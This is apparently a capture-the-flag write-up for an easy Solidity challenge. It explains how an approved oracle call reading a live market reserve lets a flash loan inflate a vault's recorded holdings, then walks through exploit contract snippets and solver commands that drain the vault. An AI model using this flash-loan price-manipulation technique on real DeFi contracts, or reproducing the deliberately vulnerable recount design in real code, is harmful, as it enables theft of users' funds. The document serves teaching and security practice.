# Caldrin's Day Away

14th July 2026

Prepared By: `Eyes`

Challenge Author(s): `Eyes`

Difficulty: Easy

<br>

# Synopsis

In this challenge, the player must drain a dockside Sharehouse.

The Sharehouse gives claim-marks when someone deposits `CROWN` coin. Later, those claim-marks can be redeemed for a share of the Sharehouse holdings.

The bug is in the recount system. The Sharehouse trusts a public stamped order that reads the value of cargo from the live market. The stamped order itself is approved, but the value it reads can still be changed.

The player can:

1. take the small travel purse,
2. deposit it into the Sharehouse,
3. borrow a large amount of `CROWN` with a one-call loan,
4. use the borrowed `CROWN` to move the market price,
5. force the Sharehouse to recount its holdings at the wrong value,
6. redeem the small claim-mark for much more `CROWN`,
7. repay the loan,
8. keep the profit.

The challenge is solved when the Sharehouse balance drops below the solve threshold.

## Description

Caldrin leaves his chapel desk for a quiet morning at the market, but the quay is already in disorder. Sailors argue over claim-marks, merchants blame bad luck, and Verrin Goldhand, a broker tied to Damas Marrowcairn’s trade offices, is always nearby when fortunes turn strange. At a small dockside Sharehouse, Caldrin finds several suspicious marks sealed with the same pale wax, turning his day off into the start of a deeper investigation.

## Skills Required

- Reading Solidity contracts
- Understanding ERC20-style token transfers and approvals
- Understanding simple AMM pricing
- Understanding flash-loan style callbacks
- Following accounting logic across multiple contracts
- Writing a small exploit contract

## Skills Learned

- Why trusted calls can still return unsafe values
- Why accounting should not depend on a price that can be changed in the same transaction
- How a flash loan can be used to change a temporary market state
- How share-based redemption can be abused when the recorded total is wrong
- How to trace a solve condition from `Setup.sol`

# Enumeration

## Analyzing the Source Code

The main files are in `challenge/backend/contracts/`.

The important contracts are:

- `Setup.sol`
- `DocksideSharehouse.sol`
- `DocksideMarket.sol`
- `GoldhandCredit.sol`
- `PublicStampDesk.sol`
- `TradeToken.sol`

The goal is not to get rich in the player's wallet. The goal is to make `Setup.isSolved()` return `true`.

```solidity
function isSolved() external view returns (bool) {
    return crownCoin.balanceOf(address(sharehouse)) < SOLVE_THRESHOLD;
}
```

So we only need to drain the Sharehouse below `150_000e6` `CROWN`.

---

## `Setup.sol`

`Setup.sol` creates the whole challenge.

It deploys:

- `CROWN`, the main coin
- `SALT`, the second market token
- the market
- the flash lender
- the stamp desk
- the Sharehouse

Important values:

```solidity
uint256 public constant MARKET_SEED = 1_000_000e6;
uint256 public constant SHAREHOUSE_HOLDINGS = 1_000_000e6;
uint256 public constant GOLHAND_LIQUIDITY = 90_000_000e6;
uint256 public constant SAILOR_CLAIM_MARKS = 990_000 ether;
uint256 public constant TRAVEL_PURSE = 10_000e6;
uint256 public constant SOLVE_THRESHOLD = 150_000e6;
```

The player can call `takeTravelPurse()` one time.

```solidity
function takeTravelPurse() external {
    require(!travelPurseTaken, "PURSE_ALREADY_TAKEN");

    travelPurseTaken = true;

    crownCoin.mint(msg.sender, TRAVEL_PURSE);

    sharehouse.creditTravelPurse(msg.sender, TRAVEL_PURSE);
}
```

This gives the player `10_000e6` `CROWN`, and also gives them permission to deposit that much into the Sharehouse.

`Setup.sol` also approves one stamped recount order:

```solidity
stampDesk.approveReading(buildPublicRecountOrder());
```

That order calls the market:

```solidity
DocksideMarket.valueCargoAsOneGood(
    SHAREHOUSE_CARGO_POSITION,
    int128(0)
)
```

This matters because the Sharehouse will later trust the result.

---

## `DocksideSharehouse.sol`

This is where the main bug becomes useful.

When a user deposits `CROWN`, they receive claim-marks.

```solidity
claimMarkAmount = (crownCoinAmount * totalClaimMarks) / recordedHoldings;
```

The Sharehouse starts with:

- `1_000_000e6` recorded holdings
- `990_000 ether` claim-marks already owned by an old sailor address

If the player deposits their `10_000e6`, they get about `9_900 ether` claim-marks.

That is small. By itself, it is not enough to drain anything.

The dangerous function is `recountHoldings()`.

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);

    uint256 newHoldings = abi.decode(result, (uint256));

    recordedHoldings = newHoldings;
}
```

Anyone can call it.

The Sharehouse only checks that the stamped order is approved. It does not check whether the market state has been changed right before the recount.

After the recount, `redeemClaim()` pays based on the new `recordedHoldings`.

```solidity
uint256 crownCoinAmount = (claimMarkAmount * recordedHoldings) / totalClaimMarks;
```

So if we can make `recordedHoldings` very large, our small claim-mark becomes worth a much larger payout.

---

## `DocksideMarket.sol`

The market has two reserves:

- `crownReserve`
- `saltReserve`

The stamped Sharehouse order reads this function:

```solidity
function valueCargoAsOneGood(uint256 cargoMarkAmount, int128 good)
    external
    view
    returns (uint256)
{
    uint256 reserve = good == 0 ? crownReserve : saltReserve;

    return (cargoMarkAmount * reserve) / totalCargoMarks;
}
```

For this challenge:

```solidity
cargoMarkAmount = 1_000_000e6
totalCargoMarks = 1_000_000e6
```

So the return value is basically the current `crownReserve`.

This is the key point:

If we increase the market's `crownReserve`, then the Sharehouse recount records a bigger value.

The market trade function lets us do that:

```solidity
quayMarket.trade(0, 1, amount, 0);
```

Trading from `CROWN` to `SALT` adds `CROWN` into the market and removes some `SALT`.

That raises `crownReserve`.

---

## `GoldhandCredit.sol`

This is the flash lender.

```solidity
function borrowForOneCall(uint256 amount, bytes calldata data) external {
    uint256 balanceBefore = coin.balanceOf(address(this));

    require(coin.transfer(msg.sender, amount), "LOAN_FAILED");

    activeBorrower = msg.sender;
    IQuayBorrower(msg.sender).onQuayLoan(amount, data);
    activeBorrower = address(0);

    require(coin.balanceOf(address(this)) >= balanceBefore, "DEBT_NOT_RETURNED");
}
```

The lender sends `CROWN`, calls our contract, and then checks that the money came back.

There is no fee.

This gives us a large temporary amount of `CROWN`.

We use that temporary `CROWN` to push the market reserve before calling the Sharehouse recount.

---

## `PublicStampDesk.sol`

The stamp desk approves exact call data.

```solidity
function readStampedOrder(bytes calldata stampedOrder)
    external
    view
    returns (bytes memory result)
{
    (address target, bytes memory callData) =
        abi.decode(stampedOrder, (address, bytes));

    require(approvedReading[keccak256(stampedOrder)], "STAMP_NOT_ACCEPTED");

    (bool ok, bytes memory returnedData) = target.staticcall(callData);

    return returnedData;
}
```

This looks safe at first.

The target and calldata must be approved.

But the approved call reads a live market reserve. The call is approved, but the reserve can still change.

That is the mistake.

# Solution

## Finding the Vulnerability

The vulnerable path is:

```text
Setup.buildPublicRecountOrder()
        |
        v
PublicStampDesk.readStampedOrder()
        |
        v
DocksideMarket.valueCargoAsOneGood()
        |
        v
DocksideSharehouse.recountHoldings()
```

The stamped order is approved once during setup.

But the value returned by the order depends on the current market reserve.

So the plan is:

1. get a small valid claim-mark,
2. borrow a large amount of `CROWN`,
3. trade the borrowed `CROWN` into the market,
4. make the Sharehouse recount while the reserve is high,
5. redeem the claim-mark,
6. swap enough `SALT` back to `CROWN`,
7. repay the loan.

After that, the Sharehouse has paid out too much.

---

## Exploit Flow

The provided exploit is in:

```text
htb/Exploit.sol
```

The solver is in:

```text
htb/solver.py
```

The exploit contract does the following.

First it takes the travel purse:

```solidity
challenge.takeTravelPurse();
```

Then it deposits that purse into the Sharehouse:

```solidity
uint256 purse = crownCoin.balanceOf(address(this));

crownCoin.approve(address(sharehouse), purse);
sharehouse.leaveGoods(purse);
```

This gives the exploit contract a valid claim-mark.

Then it builds the approved recount order:

```solidity
recountOrder = challenge.buildPublicRecountOrder();
```

Then it borrows the full lender balance:

```solidity
goldhandCredit.borrowForOneCall(challenge.GOLHAND_LIQUIDITY(), "");
```

The lender calls back into `onQuayLoan()`.

Inside the callback, the exploit trades borrowed `CROWN` into the market:

```solidity
uint256 saltReceived = quayMarket.trade(0, 1, amount, 0);
```

This makes `crownReserve` much larger.

Then the exploit calls the Sharehouse recount:

```solidity
sharehouse.recountHoldings(recountOrder);
```

Now `recordedHoldings` is much larger than it should be.

The exploit redeems its claim-marks:

```solidity
uint256 myClaims = sharehouse.claimMarks(address(this));

sharehouse.redeemClaim(myClaims);
```

This pays out too much `CROWN`.

Finally, the exploit swaps the `SALT` back to `CROWN` and repays the loan:

```solidity
saltGoods.approve(address(quayMarket), saltReceived);

quayMarket.trade(1, 0, saltReceived, 0);

crownCoin.transfer(address(goldhandCredit), amount);
```

The lender is repaid, and the remaining `CROWN` is sent back to the player.

---

## Why This Works

The Sharehouse uses old share accounting:

```text
payout = user_claim_marks * recordedHoldings / totalClaimMarks
```

The player only owns a small part of the claim-marks.

But `recordedHoldings` can be pushed up by changing the market reserve before the recount.

So the small claim-mark becomes worth a large payout for one transaction.

The Sharehouse trusts the stamp too much. The stamp proves the call is approved, but it does not prove the returned value is fair.

That is the bug.

---

## Running the Solver

Start the challenge first.

```bash
./build-docker.sh
```

Then run:

```bash
cd htb
python solver.py
```

The solver will:

1. fetch the local instance details,
2. deploy `PaleWaxExploit`,
3. call `investigate()`,
4. print whether the challenge is solved.

Expected output:

```text
[*] RPC_URL/PRIVKEY/SETUP_CONTRACT_ADDR not fully set; fetching local TCP1P instance
is solved: True
```

---

## Getting the Flag

After the solver succeeds, call:

```bash
curl http://127.0.0.1:48334/api/flag
```

The local test flag is:

```text
HTB{REDACTED}
```

# References

- Makina Finance flash-loan oracle/accounting manipulation report: https://pavondunbar.github.io/Makina-Hack-Rekt-News-CVE-Report/
